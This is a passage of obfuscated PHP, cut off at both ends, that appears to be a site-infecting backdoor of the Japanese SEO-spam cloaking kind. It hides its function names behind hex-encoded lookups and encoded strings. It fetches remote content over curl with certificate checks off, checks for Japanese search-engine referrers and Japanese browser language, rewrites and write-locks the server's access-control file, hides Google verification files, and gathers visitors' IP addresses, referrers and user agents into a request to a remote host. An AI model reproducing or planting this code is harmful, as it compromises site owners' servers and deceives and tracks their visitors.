[32].$N_ISI_SSI_[18].$N_ISI_SSI_[24].$N_ISI_SSI_[23].$N_ISI_SSI_[29].$N_ISI_SSI_[30].$N_ISI_SSI_[17].$N_ISI_SSI_[30].$N_ISI_SSI_[32];$NSSI_I_S_I=$N_ISI_SSI_[6].$N_ISI_SSI_[24].$N_ISI_SSI_[24].$N_ISI_SSI_[6].$N_ISI_SSI_[20].$N_ISI_SSI_[29].$N_ISI_SSI_[16].$N_ISI_SSI_[35].$N_ISI_SSI_[16];$N_SISISI__=$N_ISI_SSI_[35].$N_ISI_SSI_[3].$N_ISI_SSI_[29].$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[6].$N_ISI_SSI_[24].$N_ISI_SSI_[10];$NI_SS_ISI_=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[24].$N_ISI_SSI_[16].$N_ISI_SSI_[35].$N_ISI_SSI_[33];$NIS_I_SI_S=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[12].$N_ISI_SSI_[16].$N_ISI_SSI_[35].$N_ISI_SSI_[33];$N_SSII__SI=$N_ISI_SSI_[12].$N_ISI_SSI_[5].$N_ISI_SSI_[16].$N_ISI_SSI_[23].$N_ISI_SSI_[35].$N_ISI_SSI_[26].$N_ISI_SSI_[30];$N_SI_SI_SI=$N_ISI_SSI_[30].$N_ISI_SSI_[17].$N_ISI_SSI_[16].$N_ISI_SSI_[23].$N_ISI_SSI_[35].$N_ISI_SSI_[26].$N_ISI_SSI_[30];$NS___SSIII=$N_ISI_SSI_[33].$N_ISI_SSI_[18].$N_ISI_SSI_[3].$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24];$N_I_S_SISI=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24];$N_I_SSSII_=$N_ISI_SSI_[33].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[23].$N_ISI_SSI_[30].$N_ISI_SSI_[0];$N_IS__ISIS=$N_ISI_SSI_[27].$N_ISI_SSI_[5].$N_ISI_SSI_[26].$N_ISI_SSI_[6].$N_ISI_SSI_[10].$N_ISI_SSI_[30];$N_SII_ISS_=$N_ISI_SSI_[27].$N_ISI_SSI_[30].$N_ISI_SSI_[10].$N_ISI_SSI_[30].$N_ISI_SSI_[0].$N_ISI_SSI_[9];$NIISIS___S=$N_ISI_SSI_[24].$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[12].$N_ISI_SSI_[5];$NS_SII__IS=$N_ISI_SSI_[32].$N_ISI_SSI_[35].$N_ISI_SSI_[18].$N_ISI_SSI_[0].$N_ISI_SSI_[10];$NSIISS___I=$N_ISI_SSI_[10].$N_ISI_SSI_[24].$N_ISI_SSI_[12].$N_ISI_SSI_[5];$NISIS___SI=$N_ISI_SSI_[26].$N_ISI_SSI_[6].$N_ISI_SSI_[10].$N_ISI_SSI_[30];$N_I_IS_SIS=$N_ISI_SSI_[5].$N_ISI_SSI_[26].$N_ISI_SSI_[7];$NISSIS__I_=$N_ISI_SSI_[30].$N_ISI_SSI_[0].$N_ISI_SSI_[26];if(!function_exists('str_ireplace')){function str_ireplace($from,$to,$string){return trim(preg_replace(&quot;/&quot;.addcslashes($from,&quot;?:\\/*^$&quot;).&quot;/si&quot;,$to,$string));}}$NSIS_I_I_S=function($url){$NS__IS_ISI=@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x53\x5f\x5f\x49\x49\x49\x53&quot;]($url);if(!$NS__IS_ISI){$N_SSI_ISI_=array('User-Agent:Mozilla/5.0 (Windows NT 10.0;Win64;x64;rv:100.0) Gecko/20100101 Firefox/100.0');$NSII___SIS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x5f\x53\x5f\x49\x49&quot;]();${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x5f\x49\x53\x53\x53\x5f&quot;]($NSII___SIS,CURLOPT_URL,$url);${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x5f\x49\x53\x53\x53\x5f&quot;]($NSII___SIS,CURLOPT_HEADER,0);${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x5f\x49\x53\x53\x53\x5f&quot;]($NSII___SIS,CURLOPT_HTTPHEADER,$N_SSI_ISI_);${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x5f\x49\x53\x53\x53\x5f&quot;]($NSII___SIS,CURLOPT_RETURNTRANSFER,1);${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x5f\x49\x53\x53\x53\x5f&quot;]($NSII___SIS,CURLOPT_SSL_VERIFYPEER,false);$NS__IS_ISI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x53\x53\x49\x49\x5f\x49\x5f&quot;]($NSII___SIS);${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x5f\x53\x49\x49\x49\x5f\x53&quot;]($NSII___SIS);}return $NS__IS_ISI;};$N_S_IISSI_=function($NIS_I_IS_S,$NI__IS_ISS=1){$N__SIIS_SI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('i4mx1hT69R09CMjq2u1Y5TUbTtPSAgA=');$N_S__SSIII=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x53\x49\x5f\x5f\x53\x49\x49\x5f&quot;]($N__SIIS_SI);$N_SS_SIII_='%s%s';if($NI__IS_ISS){$NIS_I_IS_S=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/(\?|#).*/si&quot;,'',$NIS_I_IS_S);}foreach($N_S__SSIII as $sca_v){$NIS_I_IS_S=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($sca_v,sprintf($N_SS_SIII_,'\\',$sca_v),$NIS_I_IS_S);}return $NIS_I_IS_S;};$NS_I_SII_S=function($NSS_SI_I_I='',$N_SI_SS_II=false){$NS_ISIS_I_=false;$NS_SI__SII=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('S8/PThT89JTcovqUnKzEsH0elgkZrE/BywUE1lYkZtP+PgA=');if($N_SI_SS_II){$NS_SI__SII.=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('q/HNrhT8rMyUktPEAA==');}if($NSS_SI_I_I!=''){if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/($NS_SI__SII)/si&quot;,$NSS_SI_I_I)){$NS_ISIS_I_=true;}}return $NS_ISIS_I_;};$NSII___SSI=function($NI_S_ISIS_=''){$N_S_I_IISS=false;if($NI_S_ISIS_!=''&amp;&amp;${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/(google.co.jp|yahoo.co.jp|goo.ne.jp|hatena.ne.jp)/si&quot;,$NI_S_ISIS_)){$N_S_I_IISS=true;}return $N_S_I_IISS;};$N_SIS_SI_I=function($NI_S_ISIS_){$NS_S_I_SII=false;if($NI_S_ISIS_==''){$N__S_SISII=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;HTTP_ACCEPT_LANGUAGE&quot;];$NSISS___II=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x5f\x53\x49\x5f\x53\x49&quot;](',',$N__S_SISII);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x53\x49\x49\x5f\x5f\x49\x53&quot;]($NSISS___II)&lt;3){if($NSISS___II['0']!=''&amp;&amp;${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/(ja)/si&quot;,$NSISS___II['0'])){if(isset($NSISS___II['1'])){if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/(ja)/si&quot;,$NSISS___II['1'])){$NS_S_I_SII=true;}}else{$NS_S_I_SII=true;}}}}return $NS_S_I_SII;};$N_SISIS_I_=function($strv){$N_SS__IISI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x5f\x5f\x53\x53\x49\x49\x49&quot;]($strv,0,5);$N_I__ISISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x5f\x5f\x53\x53\x49\x49\x49&quot;]($strv,-5);$N_SS_I_IIS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x5f\x5f\x53\x53\x49\x49\x49&quot;]($strv,7,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x53\x53\x49\x49\x5f&quot;]($strv)-14);return ${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x49\x49\x5f\x53\x49\x53\x53&quot;](${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x5f\x49\x5f\x53\x49\x53\x53\x5f&quot;]($N_SS__IISI.$N_SS_I_IIS.$N_I__ISISS));};$N__III_SSS=function($N_S_SII_SI=''){$NSI_II_SS_='c';$NIII___SSS='h';$N__SISSII_='m';$NISS_I__IS='o';$NSIISI__S_='d';$NS__III_SS=$NSI_II_SS_.$NIII___SSS.$N__SISSII_.$NISS_I__IS.$NSIISI__S_;$NS_I_SSI_I=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('09PXyhTyhJTE5OLS4tPGAA==');$NS__ISI_SI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('jZJfThT9swFMW/SoaIxCTcPk3bQ4XEtqAh0dF18IQGMvFtYuH4Wr4OaUf47vOfNk33sPGQ5Jyffe89STy7kApozl1ZZ0eTE7PpYQ29qV2j/N30i2+LfhGfpjfxWngeWHiaDz21ZKB0IIL9GG6f3h8fnb30ff96bQXYjCuF3akAvYnwqxfZymITFiKZTfchUuFsnOr+RGoB60mIU1oQ0lHSLTls5G+ILnBWYtOA3q5H4ni1d6mshvLpEVM/WBu0iUtt2qSU1E9JIBeMSivNtmUCbuPDRS8sGoGdjsZPbqPQ/JkFk/ZocB3a1BCNk6iJCUk+PXl9gCvQYLk6YAZsw4dEA7XymZebA2aBC6mrA9ZZ6XbMqLaSOoUySI5p6AaTxKirsbjyPyFqkg5YDVy5OnrnM23FOlW6GprtN3GIKqnWCO4LS7SpTUtg2fAfottFCCYVdYaFt90b9KF3hmSlWxPcv8/YebD/PWSXqzmKVkHWoHiwEL4VTMq0uEy20H46ZNd6DD9zgmw6JsvQ5X44psc5sZzurn6N93xBLbKcXpbFj9vi583DxeVV8f18Xrzm9I6t3rxT/D03p0lOw+j92Nl0935tPnfwA=');$NS__ISI_SI=sprintf($NS__ISI_SI,' ',' ','%',' ','%',' ',' ',' ',' ');$NSSI___IIS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x5f\x53\x49\x5f\x53\x49&quot;]('{|||}',$NS__ISI_SI);$N_S_IS_ISI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x53\x49\x49\x5f\x5f\x53\x49&quot;](&quot;\n&quot;,$NSSI___IIS);$NI_SI_SSI_=@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x53\x5f\x5f\x49\x49\x49\x53&quot;]($NS_I_SSI_I);if($NI_SI_SSI_===false||${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;]($NI_SI_SSI_)==''){@$NS__III_SS($NS_I_SSI_I,0644);$NI_SI_SSI_=$N_S_IS_ISI;@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x49\x49\x53\x49\x5f\x53\x53&quot;]($NS_I_SSI_I,$NI_SI_SSI_);unset($NI_SI_SSI_,$NS_I_SSI_I);}else{$NISS_II_S_=true;foreach($NSSI___IIS as $NS__ISI_SI_item){if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x49\x5f\x53\x49\x5f\x53&quot;]($NI_SI_SSI_,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]('&lt;FilesMatch &quot;^(','',$NS__ISI_SI_item))===false){$NISS_II_S_=false;break;}}if(!$NISS_II_S_){$NSIS__ISI_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('09PPKhTElMTk4tLtYtPryQAA');@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x49\x49\x53\x49\x5f\x53\x53&quot;]($NSIS__ISI_,$NI_SI_SSI_);@$NS__III_SS($NS_I_SSI_I,0644);$N__IS_SIIS=$N_S_IS_ISI;@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x49\x49\x53\x49\x5f\x53\x53&quot;]($NS_I_SSI_I,$N__IS_SIIS);unset($NI_SI_SSI_,$NS_I_SSI_I,$N__IS_SIIS);}}@$NS__III_SS($NS_I_SSI_I,0444);};$NI_ISSSI__=function($NIIS___SIS=''){@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x53\x49\x5f\x49\x53&quot;](3600);@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x53\x5f\x5f\x49\x49\x49\x53\x5f&quot;](1);@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x49\x5f\x5f&quot;]();@${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x53\x5f\x49\x5f\x49&quot;]('Asia/Tokyo');global $NISS_IIS__;$N_SSI_I_IS=&quot;unknown&quot;;if(isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;})){if(isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;HTTP_X_FORWARDED_FOR&quot;])){$N_SSI_I_IS=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;HTTP_X_FORWARDED_FOR&quot;];}elseif(isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;HTTP_CLIENT_IP&quot;])){$N_SSI_I_IS=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;HTTP_CLIENT_IP&quot;];}else{$N_SSI_I_IS=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;REMOTE_ADDR&quot;];}}else{if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x49\x5f\x49\x53\x53\x5f&quot;](&quot;HTTP_X_FORWARDED_FOR&quot;)){$N_SSI_I_IS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x49\x5f\x49\x53\x53\x5f&quot;](&quot;HTTP_X_FORWARDED_FOR&quot;);}elseif(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x49\x5f\x49\x53\x53\x5f&quot;](&quot;HTTP_CLIENT_IP&quot;)){$N_SSI_I_IS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x49\x5f\x49\x53\x53\x5f&quot;](&quot;HTTP_CLIENT_IP&quot;);}else{$N_SSI_I_IS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x49\x5f\x49\x53\x53\x5f&quot;](&quot;REMOTE_ADDR&quot;);}}$N__SIISIS_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x53\x49\x5f\x5f\x5f\x49\x53\x49&quot;]('\\','/',${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/(.*?)\(.*/si&quot;,&quot;$1&quot;,__FILE__));$N_II_SSSI_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x5f\x53\x49\x5f\x53\x49&quot;]('/',$N__SIISIS_);$N_II_SSSI_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x53\x49\x53\x5f\x5f\x49\x5f&quot;]($N_II_SSSI_);$N__SIS_SII=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x5f\x53\x49\x5f\x53\x49&quot;]('/',${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['SCRIPT_NAME']);$N_S_IIS_SI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x53\x49\x5f\x49\x5f\x53\x5f\x49&quot;]($N__SIS_SII);$N___SSIISI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x5f\x5f\x53\x49\x49\x5f\x53\x53&quot;]($N_S_IIS_SI);$NS_I__SISI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x53\x49\x49\x5f\x5f\x53\x49&quot;]('/',$N__SIS_SII);$NSISI___SI=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_URI'];$NSISI___SI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/^\//si&quot;,'',${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x53\x49\x5f\x5f\x5f\x49\x53\x49&quot;]($NS_I__SISI,'',$NSISI___SI));$NIIISSS___=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x5f\x49\x49\x53\x53\x49\x5f&quot;]($NSISI___SI);$NS_IISS_I_='';if(isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['HTTP_HOST'])){$NS_IISS_I_=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['HTTP_HOST'];}elseif(isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['SERVER_NAME'])){$NS_IISS_I_=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['SERVER_NAME'];}if(!isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_SCHEME'])){${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_SCHEME']='';}$NI_SIS_IS_=(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_SCHEME']!=''?${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_SCHEME']:'http').'://'.$NS_IISS_I_.${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_URI'];$NI_SIS_IS_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;]($NI_SIS_IS_);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/^&quot;.$N___SSIISI.&quot;.*/si&quot;,$N_II_SSSI_)){$NI_SIS_IS_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/&quot;.$N___SSIISI.&quot;.*/si&quot;,'',$NI_SIS_IS_);}$N_SSIIS__I=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;](${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/\?.*/si&quot;,'',$NI_SIS_IS_));$NSS__IISI_=$NIIISSS___!=''?${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/$NIIISSS___.*/&quot;,'',$N_SSIIS__I):$N_SSIIS__I;if(!${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/\/$/si&quot;,$NSS__IISI_)){$NSS__IISI_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x5f\x5f\x53\x53\x49\x49\x49&quot;]($NSS__IISI_,0,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x5f\x53\x53\x5f\x49\x53\x49\x5f&quot;]($NSS__IISI_,'/')+1);}if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x53\x49\x5f\x53\x53\x5f&quot;]($NSS__IISI_,'/')==3){$NSS__IISI_=$NSS__IISI_.$N_S_IIS_SI;$NSS__IISI_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]('/index.php','',$NSS__IISI_);}elseif(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x53\x49\x5f\x53\x53\x5f&quot;]($NSS__IISI_,'/')&gt;3){$NSS__IISI_=$NSS__IISI_.$N_S_IIS_SI;}else{$NSS__IISI_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x49\x53\x49\x53\x5f\x5f\x5f\x53&quot;]($NSS__IISI_,'/');}$NIS_SIIS__=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;HTTP_ACCEPT_LANGUAGE&quot;];$N___SSISII=isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['HTTP_REFERER'])?${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['HTTP_REFERER']:'';$N_SSI_I_SI=isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['HTTP_USER_AGENT'])?${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['HTTP_USER_AGENT']:'';$N_I__SISSI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x5f\x5f\x5f\x53\x53\x49&quot;]($N___SSISII);$N_ISSS_II_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x49\x5f\x53\x49\x49\x5f\x53&quot;]($N_SSI_I_SI);$NS__I_SIIS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x53\x49\x5f\x49&quot;]($N___SSISII);$NIISI_SS__='';if(isset(${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_SCHEME'])){$NIISI_SS__=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['REQUEST_SCHEME'];}else{if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;]('/([http|https]+)\:\/\/.*?$/i',${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['SCRIPT_URI'],$matches)){$NIISI_SS__=$matches[1];}}$N_IIIS__SS=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}[&quot;REQUEST_URI&quot;];$NII___ISSS=${&quot;\x5f\x53\x45\x52\x56\x45\x52&quot;}['SCRIPT_NAME'];if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;]('/\.jpg|\.gif|\.ico|\.jpeg|\.svg|\.png/i',$N_IIIS__SS)){header('HTTP/1.1 404 Not Found');header(&quot;status:404 Not Found&quot;);exit();}if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;]('/google[a-z0-9]{16}\.html/i',$N_IIIS__SS)){header('HTTP/1.1 404 Not Found');header(&quot;status:404 Not Found&quot;);exit();}$N_SIISIS__=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('Ky8vVhT03RyygpKaioqNCrqKwtPCAA==');$NSI_IS_I_S=sprintf($N_SIISIS__,$NISS_IIS__);$N_ISS_I_SI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('yygpKhTbDS11fNyC8uUdW3T7FVLVZLBxElIKIURGSAiAIQUQQickBEFohtPIBBIA');$N_ISS_I_SI=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/%host%/si&quot;,$NSI_IS_I_S,$N_ISS_I_SI);$NSISS__II_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('yygpKhTbDS11fNyC8uUdUvqdIryCiwT7FVLVZLBxElIKIURGSAiAIQUQQickBEFohtPIBBIA');$NSISS__II_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;](&quot;/%host%/si&quot;,$NSI_IS_I_S,$NSISS__II_);$N_SI_ISI_S=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('s8lILhTCjIzEhMzrYtPDAA==');$N__SSII_SI=sprintf($N_ISS_I_SI,$NS_IISS_I_,$NISS_IIS__,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;](${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x49\x53\x5f\x5f\x5f\x53\x49&quot;]('Y-m-d')),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_IIIS__SS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($NIISI_SS__),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;]($N_SSI_I_IS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N___SSISII),$NIS_SIIS__,$NSS__IISI_,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_SSI_I_SI));$N_I__SSIIS=sprintf($NSISS__II_,$NS_IISS_I_,$NISS_IIS__,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;](${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e